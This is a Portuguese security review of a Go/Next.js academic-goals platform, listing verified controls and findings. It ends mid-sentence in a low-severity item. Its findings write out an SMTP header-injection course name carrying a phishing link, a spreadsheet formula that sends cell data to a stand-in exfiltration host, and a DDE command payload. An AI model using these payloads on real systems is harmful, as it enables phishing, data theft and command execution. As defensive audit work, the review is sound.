# Revisão de segurança — `indicadores`, `cursos`, `plano-acao`, `metas-coordenacao`

**Data:** 29/09/2026 · **Autor:** `security-reviewer`
**Escopo:** as quatro features construídas sobre a fundação de metas. **Não**
reabre `autenticacao-usuarios` (revisada e aceita em ciclo anterior), exceto
onde uma destas quatro features regride um mitigante que restou de lá.
**Entradas:** `specs/_fundacao-metas.md` · `design.md`/`spec.md` das quatro ·
`specs/autenticacao-usuarios/design.md` (revisão 8, §4.4 e §15) ·
`specs/autenticacao-usuarios/security-review.md` · código em `backend/` e
`frontend/` · varreduras de dependência executadas nesta rodada.

> **Método.** Antes de registrar qualquer achado, confirmei que não se trata de
> decisão deliberada já registrada. Os itens abaixo **não** são achados e não
> aparecem neste documento: mensagem de login genérica, `404` no lugar de `403`
> dentro da instituição, ausência de limite de tentativas, catálogo do INEP
> compartilhado entre instituições, `DISTINCT` proibido no relatório (o uso que
> encontrei é discutido em B-3), `motivo` no corpo do e-mail de recusa (é
> conteúdo decidido em `metas-coordenacao/design.md` §8.4), e-mail como única
> transferência a terceiro, `best-effort` na remoção de objeto órfão.

---

## 1. Veredito

**Nenhum achado Crítico.** O mecanismo central — isolamento institucional,
exceção do catálogo comum, carteira do coordenador, chave de objeto, guardas de
porta — **foi verificado no código e se sustenta**. §2 registra o que foi
conferido e passou, porque num sistema multi-institucional o que passou é
informação tão operacional quanto o que falhou.

**Três achados Altos bloqueiam a entrega** (A-1, A-2, A-3). Nenhum deles está na
dimensão que o desenho mais protegeu (vazamento entre instituições); todos os
três estão nas **bordas novas que estas features abriram** — e-mail, relógio do
processo de fundo, e o arquivo que sai do sistema para avaliação do MEC.

| Severidade | Qtd. | Bloqueia? |
|---|---|---|
| 🔴 Crítico | 0 | — |
| 🟡 Alto | 3 | **Sim** — A-1, A-2, A-3 |
| 🟠 Médio | 5 | Não, mas M-1 e M-4 enfraquecem garantias declaradas |
| 🔵 Baixo / observação | 9 | Não |

**Achado já aberto que continua valendo:** o Crítico **C-2** da revisão anterior
(comentários em código que vai para o bundle) **não foi encerrado** — `design.md`
§16 registra T-096 a T-109 como pendentes. Estas quatro features **acrescentaram
21 comentários autorais em 5 arquivos** ao mesmo defeito. Não abro um Crítico
novo: o bloqueio já existe. Registro o agravamento em M-5 para que a correção
pendente cubra os arquivos novos.

---

## 2. O que foi verificado e **está correto**

Registro explicitamente, com o arquivo, para que a próxima revisão não refaça.

### 2.1 A exceção ao isolamento (o ponto de maior risco do desenho)

`backend/internal/adapter/postgres/escopo_sql.go:55-75`

- **O parêntese externo do `OR` existe e está no lugar certo.** A cláusula
  emitida é literalmente
  `( <a>.instituicao_id = $n OR ( <a>.instituicao_id IS NULL AND <a>.escopo = 'plataforma' ) )`,
  e as condições são unidas por `" AND "` (`strings.Join(condicoes, " AND ")`,
  linha 108). A disjunção **não escapa** do `excluido_em IS NULL`.
- **`instituicao_id IS NULL` está presente**, e é ele que carrega a garantia —
  não o `escopo = 'plataforma'`, que depende do `CHECK`. O `CHECK` existe
  (`migrations/000002_indicadores.up.sql:21`,
  `ck_indicador_coerencia CHECK ((escopo = 'plataforma') = (instituicao_id IS NULL))`),
  mas a segurança não depende dele.
- **A exceção existe em exatamente um alvo.** `alvo.go:16-40` declara 11 alvos;
  só `AlvoIndicador` tem `admiteCatalogoComum: true`, e `todosOsAlvos` (linha 43)
  lista os 11. `TestAlvos_ExcecaoDoCatalogoEmExatamenteUm` (`alvo_test.go:9`)
  percorre a lista e reprova em zero, em dois ou se o único não for o indicador.
  `TestAplicarEscopo_SemExcecaoForaDoIndicador` e `..._SemExcecaoParaMeta`
  conferem a ausência de `" OR "` nos demais alvos.
- **A escrita não escapa pela exceção.** Este era o risco real: o `WHERE` de
  `Atualizar`, `AlterarSituacao` e `ExcluirSeSemUso`
  (`indicador_repository.go:214,243,268`) usa `AplicarEscopo(escopo, AlvoIndicador, ...)`
  e portanto **casa também com a linha de plataforma**. O que impede um PI de
  reescrever ou excluir logicamente um indicador do INEP para **todas** as
  instituições é a verificação de escopo no use case
  (`if !item.Indicador.Escopo.PertenceAInstituicao() → ErrPermissaoNegada`), presente
  nos três: `atualizar_indicador.go:49`, `alterar_situacao_indicador.go:43`,
  `excluir_indicador.go:40`. **Funciona.** Registro em M-4 que essa é hoje uma
  defesa de camada única.
- **A junção para `indicador` a partir de `meta_indicador` passa por
  `AplicarEscopo`**, nunca nua: `meta_repository.go:39-56`
  (`lateralIndicadoresDaMeta`), `entrega_repository.go:117`,
  `entrega_minhas_metas.go:19`.

### 2.2 As três portas sem verificação de escopo

`backend/internal/port/guarda_estrutural_test.go`

- **Guarda A é fail-closed de verdade.** Varre toda interface exportada de
  `internal/port` via `go/packages` + `go/types` e exige `autorizacao.Escopo` ou
  `autorizacao.Proprio` na posição 1 sempre que houver `uuid.UUID` ou entidade de
  domínio nos parâmetros. A lista enumera **dispensas**, não coberturas:
  `dispensaDeInterface` tem exatamente as três (`AutenticacaoRepository`,
  `InstituicaoPublicaQuery`, `EntregaReleRepository`) e
  `dispensaDeMetodo` está **vazio** — T-114 foi executado:
  `CoordenaCursoHoje` e o `avaliadorID` de `EntregaRepository.BuscarPorID`
  recebem `autorizacao.Proprio` (`port/entrega_repository.go:231,247`), e os dois
  pontos de chamada passam `in.Ator.Proprio()`
  (`avaliar.go:54`, `desfazer_aceitacao.go:49`).
- **Guarda C cobre o que promete, com uma ressalva de forma.** Ele prova que
  nenhum arquivo não-teste de `internal/adapter/http` menciona o identificador
  `EntregaReleRepository`, e a varredura confirma: as únicas referências fora de
  teste estão em `usecase/servico/rele/rele.go` e no `var _` de
  `adapter/postgres/entrega_rele_repository.go:11`.
  **Ressalva:** a mesma struct concreta `postgres.EntregaRepository` satisfaz
  `port.EntregaRepository` **e** `port.EntregaReleRepository`. O guarda casa por
  **nome do identificador**; se um handler algum dia receber o tipo concreto em
  vez da interface estreita, os métodos do relê ficam alcançáveis e o guarda
  continua verde. Hoje não acontece — a injeção em `cmd/api/main.go` entrega
  interfaces. Registro como B-8, não como achado de execução.
- **Guarda B** (`portas_test.go`) continua com a lista fechada e as assinaturas.

### 2.3 Upload e download de anexo

- **A chave de objeto nunca vem do cliente.** `chaveDoObjeto`
  (`usecase/command/entrega/registrar.go:238`) monta
  `entrega-anexo/<instituicaoID>/<entregaID>/<uuidv7>` — o `nomeOriginal` é
  recebido como parâmetro e **descartado**. Em `documento`, a chave é
  `documento-plano/<instituicaoID>/<planoID>/<nanos>-<uuidv7>.docx`
  (`gerar_documento.go:85`). Não há caminho de `c.Param`/`c.Query` para o adapter
  de armazenamento.
- **O download verifica autorização antes de tocar no armazenamento.**
  `BuscarAnexoParaDownload` (`entrega_repository.go:387`) aplica
  `AplicarEscopo(escopo, AlvoAnexo, 2)` e só devolve `chave_objeto` se a linha
  casar; `ErrNaoEncontrado` caso contrário. O use case
  (`query/anexo/baixar.go:40`) só entrega a chave ao armazenamento **depois**
  disso, e audita tanto o sucesso quanto o negado. Mesmo padrão em
  `query/documento/baixar_documento.go:47`.
- **Os testes testam o que dizem.** Li os três:
  `TestEntregaRepository_AN05_AnexoDeOutraInstituicaoNaoEncontrado`,
  `AN06_AnexoDeCursoForaDaCarteiraNaoEncontrado` e
  `AN04_AnexoDoProprioCursoEncontrado`
  (`adapter/postgres/entrega_repository_test.go:182,207,240`). Criam massa real
  nas duas instituições / nos dois cursos, montam o `Escopo` pelo caminho real
  (`autorizacao.Autorizar`, nunca um `Escopo` fabricado) e conferem
  `domain.ErrNaoEncontrado`. **Não são testes de fachada.** A lacuna é que
  exercitam o repositório, não a rota — ver M-1.
- **Nenhuma resposta expõe URL de bucket.** O adapter S3
  (`adapter/s3/armazenamento.go`) não tem `Presign` e o endpoint só existe na
  configuração do cliente.
- **Tipo de anexo detectado pelo conteúdo**, com o segundo nível que abre o ZIP e
  exige `[Content_Types].xml` + `word/` (DOCX) ou `mimetype` (ODT) —
  `valueobject/tipo_de_anexo.go:72`. Extensão nunca participa. Limite aplicado
  **antes** do `ReadAll`, via `MaxBytesReader` + `io.LimitReader(limite+1)`
  (`entrega_handler.go:186`).

### 2.4 Carteira, perfil derivado e tempo

- Os quatro alcances de carteira ligam `restritoACarteiraDe` **sempre**, sem
  condicional (`autorizar.go:166-176`).
- `Escopo.SemCarteira()` é usada em **4 pontos, todos sobre `AlvoIndicador`**
  (`plano_repository.go:308`, `entrega_repository.go:117`,
  `entrega_minhas_metas.go:19`) — nunca no recurso de topo que o alcance
  autorizou. A restrição §15.20 da autenticação é respeitada. O seletor de
  períodos de "Minhas metas" **aplica** a carteira via `AlvoItemPlano`, em vez de
  removê-la (`entrega_minhas_metas.go:76`) — T-113 está honrado.
- **Uma leitura do relógio por requisição**, no middleware, no fuso de exibição
  (`middleware_sessao.go:57`), propagada ao `Ator` e copiada para o `Escopo` em
  todos os ramos de `Autorizar`. O `EXISTS` de designação vigente recebe a data
  como parâmetro e **não junta `curso`** (`port/autenticacao_repository.go:33-37`),
  como PC-7/`CP-06` exigem.
- **Sobreposição de designação é impossível no banco**, não na aplicação:
  `EXCLUDE USING gist` com `daterange(..., '[]')` em
  `migrations/000003_cursos.up.sql:63`. É isso que torna o `LIMIT 1` sem
  `ORDER BY` do lateral `resp` do relatório determinístico
  (`relatorio_repository.go:130`) — não é achado.
- `coordenador_curso` não é atribuível: `CHECK` no banco + recusa no
  `ConjuntoInstitucional`. `MontarConjuntoEfetivo` é chamada em dois pontos
  sancionados.

### 2.5 Injeção, paginação e borda HTTP

- **`sort`/`order` nunca chegam crus ao SQL.** `ParsePaginacao`
  (`adapter/http/paginacao.go:22`) valida contra a allowlist da entidade e
  devolve **400**, sem clampar; `page_size` máximo 100, também 400. Em segunda
  camada, cada adapter mapeia `filtro.Sort` por um `map` próprio com coluna
  padrão (`relatorio_repository.go:238`, `entrega_fila_e_badges.go:67`, etc.).
  **Nenhum `%s` de `ORDER BY` recebe texto do cliente.**
- **Busca textual escapa curingas de `LIKE`** (`busca_sql.go:13`).
- **Erros não vazam implementação.** `middleware_erro.go` traduz erro de domínio
  para código e mensagem fixos; o 500 vai para o log do servidor e responde
  genérico. Nenhum `stack`, nome de tabela ou SQL na resposta.
- **CORS por igualdade exata** contra `CORS_ALLOWED_ORIGINS`, com `Vary: Origin`,
  sem curinga (`cmd/api/main.go:502`).
- **`APP_ENV` tem default `production` no código** (`main.go:77`,
  `cmd/seed/main.go:19`) e `development` aparece **apenas** em
  `docker-compose.dev.yml`. `docker-compose.yaml` fixa `production`.
- **Swagger não é registrado em produção** (`main.go:308`).
- **Cabeçalhos de segurança da API existem** (`middleware_seguranca.go`) — A-1 da
  revisão anterior está corrigido.
- **Frontend:** nenhum token em `localStorage`/`sessionStorage` (só última
  instituição escolhida e estado de grid); **zero** `dangerouslySetInnerHTML`;
  `productionBrowserSourceMaps` não habilitado.

### 2.6 Isolamento na cadeia denormalizada

As FKs compostas que ancoram `curso_id` existem em toda a cadeia:
`plano(curso_id, instituicao_id) → curso`, `item_plano(plano_id, curso_id) → plano`,
`entrega(item_plano_id, curso_id) → item_plano`, `anexo(entrega_id, curso_id) → entrega`,
`documento(plano_id, curso_id) → plano`, mais os índices únicos correspondentes.
O `instituicao_id` gravado nas tabelas profundas é derivado da linha-pai já
recortada em todos os caminhos que li (`criar_item.go:63`,
`entrega_repository.go:312,345`, `gerar_documento.go:91`). A ressalva de **banco**
está em M-4.

---

## 3. Achados 🟡 **Alto** — bloqueiam a entrega

### A-1 · A05 — Injeção de cabeçalho e de corpo no e-mail de notificação

**Onde:**
- `backend/internal/adapter/smtp/email_sender.go:106-109` (`montarMensagem`)
- `backend/internal/domain/valueobject/nome_catalogo.go:15-21` (`NovoNomeCatalogo`)
- `backend/internal/usecase/servico/rele/rele.go:101-110` (`montarMensagem` do relê)

**O defeito.** A mensagem SMTP é montada por concatenação, sem sanitização nem
codificação do assunto:

```go
func montarMensagem(remetente, destino, assunto, corpo string) []byte {
	return []byte(fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: %s\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n%s\r\n",
		remetente, destino, assunto, corpo))
}
```

E o assunto é `"Entrega recusada — " + p.CursoNome` (`rele.go:107`), onde
`CursoNome` é `curso.nome`. O Value Object que valida esse nome só apara as
pontas e mede o comprimento:

```go
normalizado := strings.TrimSpace(bruto)
if normalizado == "" || len(normalizado) > 300 { ... }
```

`strings.TrimSpace` remove `\r\n` **das extremidades**; os internos sobrevivem.
O `CHECK` do banco (`ck_curso_nome`) só confere `btrim(nome) <> ''` e o
comprimento. **CR/LF no meio do nome de um curso é aceito em todas as camadas.**

**Vetor concreto.** Um Pesquisador Institucional cria ou renomeia um curso como:

```
Direito\r\nContent-Type: text/html\r\n\r\n<p>Sua entrega foi recusada. Reenvie em
<a href="https://phishing.exemplo/login">basis-avalia</a></p>
```

Na primeira recusa de entrega desse curso, o relê monta um assunto que **fecha o
bloco de cabeçalhos** (`\r\n\r\n`) e passa a controlar o `Content-Type` e o corpo
inteiro. `net/smtp.SendMail` valida CR/LF apenas no remetente e nos destinatários
de envelope (`validateLine`), **nunca no corpo da mensagem** — o `DATA` sai como
escrito. Resultado: mensagem HTML arbitrária saindo do **relay SMTP da própria
instituição**, com o remetente legítimo (`SMTP_FROM`) e, num relay corporativo,
com a assinatura DKIM do domínio. Um cabeçalho `Bcc:` injetado é entregue por
MTAs que expandem cabeçalhos da `DATA`.

**Por que Alto e não Baixo.** O atacante é um insider autenticado, mas o efeito
atravessa a fronteira do sistema: o destinatário é um coordenador que confia na
origem, e o canal é o único ponto em que esta entrega manda dado para fora. É
também o único lugar do projeto em que texto livre de usuário entra num protocolo
de linhas sem nenhuma codificação.

**Duas coisas que o mesmo defeito não é.** O `motivo` no corpo **é** decisão
registrada (`metas-coordenacao/design.md` §8.4: "Conteúdo: curso, meta, motivo,
data-limite, rodada"), e a mensagem **não** carrega anexo, conteúdo de
comprovante, observação da entrega nem nome de arquivo — conferi
`rele.go:112-118`. A regra da spec §9 ("nada de conteúdo, nome de arquivo ou
observação em log, em e-mail ou em mensagem de erro") **está cumprida**.

**Nota lateral do mesmo trecho:** o assunto não é codificado em RFC 2047, então
acento vai como UTF-8 cru no cabeçalho. É defeito de interoperabilidade, não de
segurança — anoto porque quem for corrigir A-1 passa por ali.

---

### A-2 · A01 / A10 — O relê resolve "hoje" em UTC e escolhe o destinatário errado perto da meia-noite

**Onde:**
- `backend/internal/adapter/postgres/entrega_rele_repository.go:20` e `:149-151`
- Regra violada: `backend/internal/adapter/postgres/designacao_vigente_sql.go:21-23`
  e `specs/_fundacao-metas.md` §5.1/§5.2 e restrição 8.

**O defeito.** A consulta que escolhe o destinatário da notificação calcula a
data de referência assim:

```go
hoje := valueObjectDataLocalString(time.Now())
...
func valueObjectDataLocalString(t time.Time) string {
	return t.UTC().Format("2006-01-02")
}
```

Esse `hoje` alimenta `FragmentoDesignacaoVigente("d", 1)` na junção com
`designacao` (`:31`) — ou seja, **é ele que decide quem é o coordenador vigente**.
O arquivo que define esse fragmento diz, em comentário, exatamente o que aqui foi
feito:

> *Proibido em qualquer adapter: `CURRENT_DATE` ou `now()` aqui dentro — é a data
> do servidor, em UTC, e diverge do dia de exibição perto da meia-noite de
> Brasília.*

O `Rele` **recebe** `fusoDeExibicao *time.Location` no construtor (`rele.go:35`) e
o usa para o prazo de correção (`rele.go:130`); a consulta do destinatário não o
recebe e lê o relógio por conta própria. Os containers rodam em UTC — o
`docker-compose.dev.yml` não define `TZ`, e o próprio design registra que isso é
deliberado para que testes de fuso não passem por acidente.

**Vetor concreto.** Designação de Ana termina em `data_fim = 2026-10-05`; a de
Bruno começa em `data_inicio = 2026-10-06`. Às **22h00 de 05/10 em Brasília**
(= 01h00 UTC de 06/10) o relê calcula `hoje = '2026-10-06'`:

- a designação de Ana deixa de ser vigente → **Ana, que ainda responde pelo curso,
  não recebe a notificação da recusa**;
- a designação de Bruno já é vigente → **Bruno recebe curso, meta, motivo da
  recusa e prazo de um curso pelo qual ainda não responde**, com a entrega marcada
  como enviada (`MarcarNotificacaoEnviada`, sem transação — ver M-2), de modo que
  Ana **nunca** a receberá.

O mesmo desvio atinge `ListarCandidatosARestauracaoDePrazo` (`:105-118`), que
compara `entrega.prazo_correcao_ate < proxima.data_inicio::timestamptz` — o cast
de `DATE` para `timestamptz` usa o fuso da **sessão do banco** (UTC), deslocando a
fronteira em 3 horas. PM-4/VG-06 restaura prazo com um dia de folga ou de menos,
dependendo do lado.

**Por que Alto.** É divulgação de dado de entrega a uma pessoa fora da janela de
autorização dela, e é perda silenciosa de notificação para quem tem o dever de
agir — nas duas direções, todo dia, durante três horas. E contraria uma restrição
declarada inegociável, cujo mecanismo de prevenção (`DataLocal`, uma leitura por
requisição) existe e funciona em todo o resto do sistema.

**Não está registrado como desvio.** Conferi
`specs/metas-coordenacao/testes-pendentes.md` §"desvios": os cinco itens listados
são outros (buffer do ZIP, backoff, heurística de `InclusEntregasAnteriores`,
ausência de seed para VG-06, progresso de upload).

---

### A-3 · A05 — Injeção de fórmula no CSV do relatório de desempenho

**Onde:** `backend/internal/adapter/http/relatorio_handler.go:213-218`
(`escaparCampoCSV`), aplicada em `:204-209`.

**O defeito.** O escape é RFC 4180 (aspas e separador), e só:

```go
func escaparCampoCSV(campo string) string {
	if strings.ContainsAny(campo, ";\"\n") {
		return `"` + strings.ReplaceAll(campo, `"`, `""`) + `"`
	}
	return campo
}
```

Três dos campos exportados são texto livre gravado por usuários da instituição:
`l.CursoNome`, `responsavel` (nome do usuário coordenador) e `l.MetaNome`. Nenhum
deles é neutralizado quando começa com `=`, `+`, `-`, `@`, `TAB` ou `CR`.

**Vetor concreto.** Um PI cadastra uma meta chamada
`=HYPERLINK("https://exfil.exemplo/?d="&A2&B2;"Ver detalhes")` — ou, em Excel com
DDE habilitado, `=cmd|' /C calc'!A0`. O arquivo exportado é justamente o artefato
que **sai do sistema** e é aberto por outra pessoa: outro PI, a gestão da
instituição, ou o avaliador do MEC. Ao abrir no Excel/LibreOffice, a fórmula é
avaliada no contexto de quem abriu, exfiltrando o conteúdo da planilha por
`HYPERLINK`/`WEBSERVICE` ou executando comando via DDE.

**Por que isto importa mais aqui do que num CSV qualquer.** A spec declara que o
produto final é um relatório de desempenho que vai para avaliação do MEC, e que
**a integridade do número é propriedade de segurança**. Uma célula que o
destinatário vê como um rótulo e a planilha trata como fórmula é ataque à
integridade do que é lido, além do vetor de execução.

**Não há decisão registrada sobre isto.** Procurei "fórmula", "formula", "CSV
injection" e "planilha" nas quatro specs, nos quatro `design.md`, na fundação e na
revisão anterior: o único resultado é `design.md` §9.3 de `metas-coordenacao`
tratando de BOM e separador. O assunto nunca foi levantado.

**Defeito menor no mesmo ponto:** `ContainsAny(campo, ";\"\n")` não inclui `\r`.
Um campo com `\r` isolado sai sem aspas e quebra a linha em leitores que tratam
CR como terminador.

---

## 4. Achados 🟠 **Médio**

### M-1 · A01 — `AutenticadaSemPermissao` saiu de "a própria conta" para seis rotas de recurso

**Onde:** `backend/internal/adapter/http/rotas.go:41-46` (o contrato) ·
`backend/cmd/api/main.go:448,456,457,465,471,474` (os usos novos).

O registro de rotas declara, no próprio código:

> *`AutenticadaSemPermissao` registra rota de sessão própria — sem permissão
> exigida porque age sobre a própria conta de quem chama (auth/eu, auth/logout,
> auth/senha, /version). **No máximo 4 ocorrências no sistema.***

Hoje são **dez**, e seis delas não agem sobre a própria conta — agem sobre
recursos de negócio: `/documentos/:id/conteudo`, `/itens/:itemId/entregas`,
`/entregas/:id`, `/anexos/:id/conteudo`, `/relatorios/desempenho`,
`/metas/pendencias`. Isso contraria D-08 de `autenticacao-usuarios` ("rota sem
permissão não compila") no exato conjunto de rotas que **alcançam recurso**.

**A autorização não desapareceu:** cada use case chama `autorizacao.Autorizar`,
com a tentativa de alcance institucional e, se negada por permissão, a de
carteira (`query/entrega/helpers.go:17-24`, `query/relatorio/desempenho.go:37-44`,
`query/anexo/baixar.go:73-82`, `query/documento/baixar_documento.go:64-73`,
`query/pendencia/contar_badges.go:27-38`). Um ator sem nenhuma das duas permissões
recebe 403. **Não é porta aberta.**

**O que se perdeu é o mecanismo.** A garantia estrutural "a permissão está na
assinatura do registro, e esquecê-la não compila" deixou de cobrir seis rotas; no
lugar dela ficou a disciplina de o autor do use case lembrar de chamar
`Autorizar` — que é precisamente o tipo de proteção que o desenho desta base
existe para eliminar. Some-se: **nenhum teste limita a quantidade** (procurei
`AutenticadaSemPermissao` em `_test.go`: só o wiring do smoke), e **nenhum
`design.md` das quatro features registra a ampliação**. O motivo técnico é real e
compreensível — a rota é alcançada por dois perfis com permissões diferentes e o
middleware aceita uma permissão por caminho —, mas é uma decisão de arquitetura
que foi tomada no código, não no desenho.

**Lacuna de cobertura relacionada:** os testes de isolamento de anexo/documento
são de repositório. Não há teste de rota provando 403 para quem não tem nenhuma
das duas permissões nem 404 para anexo de outra instituição **atravessando o
handler**.

---

### M-2 · A06 — O `SKIP LOCKED` do relê roda em autocommit; a garantia declarada não é entregue

**Onde:** `backend/internal/adapter/postgres/entrega_rele_repository.go:20,36`
(`r.db.SelectContext`, `FOR UPDATE OF entrega SKIP LOCKED`) e `:102,117`
(`ListarCandidatosARestauracaoDePrazo`) · `usecase/servico/rele/rele.go:71,124`.

O relê chama as duas consultas de lote **fora de qualquer `UnidadeDeTrabalho`**, e
os métodos usam `r.db` diretamente — não `Executor(ctx, r.db)`, que é o que
devolve a `*sqlx.Tx` do contexto. Em autocommit, o `FOR UPDATE ... SKIP LOCKED`
adquire os locks e os **libera ao fim da própria instrução**. A janela de exclusão
mútua entre réplicas passa a ser a duração do `SELECT`, não a do processamento.

O desenho afirma o contrário, em três lugares
(`_fundacao-metas.md` §7, `metas-coordenacao/design.md` §8.4, e o comentário em
`rele.go:66-69`): *"`SKIP LOCKED` é obrigatório, não otimização: o sistema roda com
N réplicas e um lock em memória faria N réplicas enviarem N e-mails."* Com o lock
liberado imediatamente, duas réplicas cujos tickers se cruzam leem o mesmo lote,
enviam o mesmo e-mail e ambas marcam `notificacao_enviada_em`.

**Impacto:** duplicação, não divulgação nova — o destinatário é o mesmo. Por isso
Médio e não Alto. Mas é uma garantia declarada que não existe, e ela também cobre
a restauração de prazo (`RestaurarPrazoPorVacancia` executada duas vezes grava
dois prazos diferentes e reenfileira a notificação duas vezes).

---

### M-3 · A02 — `SMTP_TLS` é configuração morta

**Onde:** `backend/internal/adapter/smtp/email_sender.go:31,38-39` ·
`backend/cmd/api/main.go:90` · `docker-compose.yaml:76`.

`usaTLS` é recebido no construtor, guardado na struct e **nunca lido**. Grep em
todo o backend: as únicas ocorrências são a declaração, o parâmetro e a
atribuição. `Enviar` usa `smtp.SendMail`, que negocia STARTTLS **se o servidor
anunciar** e cai para texto claro se não anunciar.

Consequência: quem configura `SMTP_TLS=true` num ambiente de produção acredita ter
exigido transporte cifrado e não exigiu nada. Se o relay corporativo não anunciar
STARTTLS, o e-mail — que carrega nome e endereço do coordenador, nome do curso,
nome da meta e o motivo da recusa, todos dado pessoal comum sob a LGPD — trafega
em claro, e `smtp.PlainAuth` recusará autenticar (o que aparece como falha, não
como risco silencioso — este é o lado bom). Também não há `InsecureSkipVerify`
(bom), mas também não há verificação de que o TLS de fato ocorreu.

---

### M-4 · A01 — A FK composta **não** ancora `instituicao_id` nas quatro tabelas profundas

**Onde:** `migrations/000004_plano_acao.up.sql:65-99` (`item_plano`, `documento`) ·
`migrations/000006_entregas.up.sql:4-77` (`entrega`, `anexo`).

`_fundacao-metas.md` §3.5 (F-05) afirma:

> *…e as FKs compostas que tornam a divergência irrepresentável […]
> `instituicao_id` desce pela mesma técnica, a partir de `curso`.*

Isso é verdade para `plano` e `designacao`, que têm
`FOREIGN KEY (curso_id, instituicao_id) REFERENCES curso (id, instituicao_id)`.
**Não é verdade** para `item_plano`, `documento`, `entrega` e `anexo`: as FKs
compostas delas ancoram apenas `(plano_id, curso_id)`, `(item_plano_id, curso_id)`
e `(entrega_id, curso_id)`. A coluna `instituicao_id` é `NOT NULL` e **nada mais**
— nenhuma FK, nenhum `CHECK`, nenhum índice único que a prenda ao pai.

`AplicarEscopo` filtra por `<alias>.instituicao_id` nesses quatro alvos. Ou seja:
**todo o isolamento institucional de entrega, anexo, item e documento repousa
sobre uma coluna que só o código da aplicação mantém correta.** Hoje o código está
correto nos quatro caminhos de `INSERT` que li (o valor vem sempre da linha-pai já
recortada). A objeção não é "há um bug"; é que a proteção que o desenho declara
como estrutural não existe, e um `INSERT` futuro que tome `instituicao_id` do
request — ou uma migração de dados — produz uma linha alcançável pela instituição
errada, sem que o banco recuse.

O mesmo vale, em camada acima, para a exceção do catálogo comum (§2.1): a
proibição de um PI escrever num indicador de plataforma é **um `if` em três use
cases**, e o repositório continua capaz de executar a escrita. Duas defesas de
camada única em pontos onde o desenho prometeu "irrepresentável".

---

### M-5 · Regressões em garantias declaradas (três, agrupadas)

**(a) `instituicao_id` escrito à mão em `WHERE` fora de `AplicarEscopo`.**
O comentário de `escopo_sql.go:9-16` afirma que a **única** exceção sancionada é
`UsuarioRepository.ContarDetentoresDoPerfil`. Existem agora mais três, todas
introduzidas por estas features:

- `indicador_repository.go:31` (`contagemMetasDaInstituicao`: `m.instituicao_id = $%d`)
- `indicador_repository.go:292` (contagem antes da exclusão)
- `plano_repository.go:585` (`PeriodoDoPlano`: `WHERE id = $1 AND instituicao_id = $2 AND excluido_em IS NULL`)

Nenhuma delas vaza hoje — as três recebem `escopo.InstituicaoID()` e, num escopo
de plataforma (ponteiro nulo), degradam para `= NULL`, que não casa com nada
(*fail-closed*). O problema é que o comentário que sustenta a auditabilidade do
mecanismo **ficou falso**, e a restrição §15.16 da autenticação exige que
comentário que afirma garantia enumere a exceção sancionada e seja **corrigido,
nunca apagado**.

**(b) Comentários autorais em arquivos que entram no bundle.** Agravamento do
Crítico **C-2**, ainda aberto (T-096 a T-109). As quatro features acrescentaram 21
comentários em 5 arquivos:
`components/layout/nav-config.ts` (10) · `features/designacao/components/encerrar-designacao-modal.tsx` (5) ·
`lib/formato.ts` (4) · `features/plano/hooks/use-cursos-sugestoes.ts` (3) ·
`features/plano/components/plano-aviso-aprovacao.tsx` (3).
O de maior conteúdo é `nav-config.ts:121-130`, que descreve em prosa a **semântica
de autorização do menu** ("um item aparece se o usuário tem QUALQUER UMA das
permissões declaradas […] é a mesma união que `Pode()` já faz no backend") e cita
`fundacao-metas.md §8`. Dois outros citam `specs/cursos` e `ux.md`. Atenuante que
a revisão anterior já registrou e continua valendo: em `next build` o SWC remove
comentários, então a exposição concreta é no modo de desenvolvimento.

**(c) Parâmetros mortos que sugerem verificação inexistente.**
`chaveDoObjeto(instituicaoID, entregaID, nomeOriginal)` (`registrar.go:238`) recebe
`nomeOriginal` e não o usa; `periodoParaResposta(item, hoje)`
(`periodo_handler.go:33`) recebe `hoje` e não o usa. No primeiro caso a assinatura
sugere que o nome do cliente participa da chave — exatamente o contrário do que o
código (corretamente) faz, e a leitura errada é fácil.

---

## 5. 🔵 Baixo e observações

**B-1 · `Content-Disposition` montado por concatenação com nome controlado pelo
usuário.** `entrega_handler.go:558`, `documento_handler.go:43,95`. O nome vem de
`anexo.nome_original` (`part.FileName()`, que o `mime/multipart` já passa por
`filepath.Base`) e de `documento.nome_arquivo`, que embute `curso.nome`
(`gerar_documento.go:84`). CR/LF **não** produz *response splitting* — o
`net/http` troca `\r` e `\n` por espaço ao escrever cabeçalho —, mas aspas duplas
quebram a *quoted-string* e permitem injetar parâmetros (`filename*`). Como a
disposição continua `attachment` e `X-Content-Type-Options: nosniff` está
presente, o efeito é confusão de nome de arquivo, não execução. Mesma raiz de
A-1: `NomeCatalogo` aceita qualquer caractere.

**B-2 · `{{` em campo de texto do plano quebra a geração do `.docx`.**
`adapter/docx/gerador.go:94`. O escape XML está correto (`xml.EscapeText` em todos
os escalares e nos itens) e o `\n → <w:br/>` está certo — **não há injeção de XML
nem de conteúdo no documento**. Mas `xml.EscapeText` não escapa `{` e `}`: um
`descricao` contendo `{{` faz `strings.Contains(final, "{{")` disparar
`ErrMarcadorNaoEncontrado` e a geração falha para sempre naquele plano até o texto
ser editado. E, como `substituirEscalares` itera um `map` (ordem aleatória em Go),
um valor contendo `{{curso_nome}}` pode ser substituído pelo valor de outro campo
do **mesmo** documento, de forma não determinística entre execuções. Escopo: o
próprio plano do próprio curso; sem travessia de fronteira.

**B-3 · `DISTINCT` no resumo do relatório.**
`relatorio_repository.go:231`: `count(DISTINCT CASE WHEN coordenador_id IS NULL
THEN curso_nome END)`. A restrição 12 da fundação proíbe `DISTINCT` na consulta do
relatório justamente porque ele mascara duplicação de junção. Aqui o `DISTINCT`
incide sobre **`curso_nome`, não sobre `curso_id`** — com o índice único parcial
`uq_curso_instituicao_nome` isso é equivalente dentro de uma instituição, mas é
uma coincidência de schema sustentando um número que vai para o MEC. O `DISTINCT`
de `ListarPeriodosParaMinhasMetas` (`entrega_minhas_metas.go:86`) tem justificativa
escrita e não agrega — não o conto.

**B-4 · LGPD — `notificacao_ultimo_erro` guarda o erro cru do SMTP.**
`entrega_rele_repository.go:85` grava `err.Error()`, e erro de SMTP normalmente
ecoa o endereço do destinatário (`550 5.1.1 <fulano@ies.br> unknown`). É dado
pessoal comum numa coluna de diagnóstico sem prazo de retenção declarado na spec.

**B-5 · LGPD — texto livre no `detalhes` da auditoria.**
`encerrar_plano.go:54` e `desfazer_aceitacao.go:79` gravam
`evento.Detalhes["motivo"] = in.Motivo`. O `CLAUDE.md` manda o `detalhes` registrar
*qual campo* mudou, não o valor. Para o desfazimento, a spec de
`metas-coordenacao` §9 classifica "avaliador, instante e **motivos**" como dado
